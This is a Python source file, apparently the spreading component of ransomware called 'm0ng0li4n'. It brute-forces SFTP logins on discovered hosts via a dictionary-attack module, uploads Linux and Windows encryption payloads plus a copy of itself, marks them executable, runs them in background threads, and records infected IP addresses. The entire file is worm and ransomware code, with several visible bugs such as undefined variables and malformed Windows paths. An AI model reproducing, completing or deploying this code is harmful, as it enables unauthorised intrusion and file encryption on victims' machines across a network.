#!/usr/bin/env python3

from get_ip import getIP
from get_os import getos
from colorama import init, Fore, Back, Style
import pysftp as sftp
import dict_attack
import threading
from platform import system

def doLinuxRunFlow(handle):
	handle.execute('/tmp/m0ng0li4n/newFlow')

def doLinuxRunPayload(handle):
	handle.execute('/tmp/m0ng0li4n/linuxEncryption')

def doWindowsRunFlow(handle, user):
	handle.execute('C:\\Users\\'+user+'\\m0ng0li4n\\newFlow.exe')

def doWindowsRunPayload(handle):
	handle.execute('C:\\Users\\'+user+'\\m0ng0li4n\\windowsEncryption.exe')

def doLinuxWithLinux(handle, user, password, ip):

	handle.put('/tmp/m0ng0li4n/ips.dat', '/tmp/m0ng0li4n/ips.dat')
	handle.put('/tmp/m0ng0li4n/linuxEncryption', '/tmp/m0ng0li4n/linuxEncryption')
	handle.put('/tmp/m0ng0li4n/linuxSaver','/tmp/m0ng0li4n/linuxSaver')
	handle.put('/tmp/m0ng0li4n/newFlow', '/tmp/m0ng0li4n/newFlow')
	handle.put('/tmp/m0ng0li4n/newFlow.exe', '/tmp/m0ng0li4n/newFlow.exe')
	handle.put('/tmp/m0ng0li4n/windowsEncryption.exe', '/tmp/m0ng0li4n/windowsEncryption.exe')
	handle.put('/tmp/m0ng0li4n/windowsSaver.exe', '/tmp/m0ng0li4n/windowsSaver.exe')
	handle.execute('chmod +x /tmp/m0ng0li4n/linuxEncryption')
	handle.execute('chmod +x /tmp/m0ng0li4n/linuxSaver')
	handle.execute('chmod +x /tmp/m0ng0li4n/newFlow')
	t1 = threading.Thread(target=doLinuxRunFlow, args=(handle,))
	t1.daemon = True
	t1.start()
	t2 = threading.Thread(target=doLinuxRunPayload, args=(handle,))
	t2.daemon = True
	t2.start()

def doWindowsWithLinux(handle, user, password, ip):

	handle.put('/tmp/m0ng0li4n/ips.dat', 'C:\\Users\\'+user+'\\m0ng0li4n\\ips.dat')
	handle.put('/tmp/m0ng0li4n/newFlow', 'C:\\Users\\'+user+'\\m0ng0li4n\\newFlow')
	handle.put('/tmp/m0ng0li4n/newFlow.exe', 'C:\\Users\\'+user+'\\m0ng0li4n\\newFlow.exe')
	handle.put('/tmp/m0ng0li4n/linuxEncryption', 'C:\\Users\\'+user+'\\m0ng0li4n\\linuxEncryption')
	handle.put('/tmp/m0ng0li4n/linuxSaver', 'C:\\Users\\'+user+'\\m0ng0li4n\\linuxSaver')
	handle.put('/tmp/m0ng0li4n/windowsEncryption.exe', 'C:\\Users\\'+user+'\\m0ng0li4n\\windowsEncryption.exe')
	handle.put('/tmp/m0ng0li4n/windowsSaver.exe', 'C:\\Users'+user+'\\m0ng0li4n\\windowsSaver.exe')
	t1 = threading.Thread(target=doWindowsRunFlow, args=(handle,user))
	t1.daemon = True
	t1.start()
	t2 = threading.Thread(target=doWindowsRunPayload, args=(handle,user))
	t2.daemon = True
	t2.start()

def doLinuxWithWindows(handle, user, password, ip):

	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\ips.dat', '/tmp/m0ng0li4n/ips.dat')
	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\newFlow', '/tmp/m0ng0li4n/newFlow')
	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\newFlow.exe', '/tmp/m0ng0li4n/newFlow.exe')
	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\linuxEncryption', '/tmp/m0ng0li4n/linuxEncryption')
	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\linuxSaver', '/tmp/m0ng0li4n/linuxSaver')
	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\windowsEncryption.exe', '/tmp/m0ng0li4n/windowsEncryption.exe')
	handle.put('C:\\Users'+user+'\\m0ng0li4n\\windowsSaver.exe', '/tmp/m0ng0li4n/windowsSaver.exe')
	t1 = threading.Thread(target=doLinuxRunFlow, args=(handle,))
	t1.daemon = True
	t1.start()
	t2 = threading.Thread(target=doLinuxRunPayload, args=(handle,))
	t2.daemon = True
	t2.start()

def doWindowsWithWindows(handle, user, password, ip):

	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\ips.dat', 'C:\\Users\\'+user+'\\m0ng0li4n\\ips.dat')
	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\newFlow', 'C:\\Users\\'+user+'\\m0ng0li4n\\newFlow')
	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\newFlow.exe', 'C:\\Users\\'+user+'\\m0ng0li4n\\newFlow.exe')
	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\linuxEncryption', 'C:\\Users\\'+user+'\\m0ng0li4n\\linuxEncryption')
	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\linuxSaver', 'C:\\Users\\'+user+'\\m0ng0li4n\\linuxSaver')
	handle.put('C:\\Users\\'+user+'\\m0ng0li4n\\windowsEncryption.exe', 'C:\\Users\\'+user+'\\m0ng0li4n\\windowsEncryption.exe')
	handle.put('C:\\Users'+user+'\\m0ng0li4n\\windowsSaver.exe', 'C:\\Users'+user+'\\m0ng0li4n\\windowsSaver.exe')
	t1 = threading.Thread(target=doWindowsRunFlow, args=(handle,user))
	t1.daemon = True
	t1.start()
	t2 = threading.Thread(target=doWindowsRunPayload, args=(handle,user))
	t2.daemon = True
	t2.start()


def main():
	host_os = system()

	if host_os == 'Windows':
		ips = getIP(host_os)
		currentUser = os.getlogin()
		with open('C:\\Users\\' + user + '\\m0ng0li4n\\ips.dat','at+') as f:
			affectedIPs = f.readlines()
			for ip in affectedIPs:
				ip = ip.strip()
				ips.remove(ip)

			for ip in ips:
				try:
					handle, user, password = dict_attack.attack(ip)
					handle.makedirs('/tmp/m0ng0li4n')
					t = threading.Thread(target=doLinuxWithWindows, args=(handle, user, password, ip), daemon=False)
					t.start()
					f.write(ip + '\n')
					break
				except:
					pass

				try:
					handle, user, password = dict_attack.attack(ip)
					handle.makedirs('C:\\Users\\'+user+'\\m0ng0li4n')
					t = threading.Thread(target=doWindowsWithWindows, args=(handle, user, password,ip), daemon=False)
					t.start()
					f.write(ip + '\n')
					break
				except:
					pass

	elif host_os == 'Linux':
		ips = getIP(host_os)
		currentUser = os.getlogin()
		with open('/tmp/m0ng0li4n/ips.dat', 'at+') as f:
			affectedIPs = f.readlines()
			for ip in affectedIPs:
				ip = ip.strip()
				ips.remove(ip)

			for ip in ips:
				try:
					handle, user, password = dict_attack.attack(ip)
					handle.makedirs('/tmp/m0ng0li4n')
					t = threading.Thread(target=doLinuxWithWindows, args=(handle, user, password, ip), daemon=False)
					t.start()
					f.write(ip + '\n')
					break
				except:
					pass

				try:
					handle, user, password = dict_attack.attack(ip)
					handle.makedirs('C:\\Users\\'+user+'\\m0ng0li4n')
					t = threading.Thread(target=doWindowsWithWindows, args=(handle, user, password,ip), daemon=False)
					t.start()
					f.write(ip + '\n')
					break
				except:
					pass
	else:
		pass


if __name__ == '__main__':
	main()
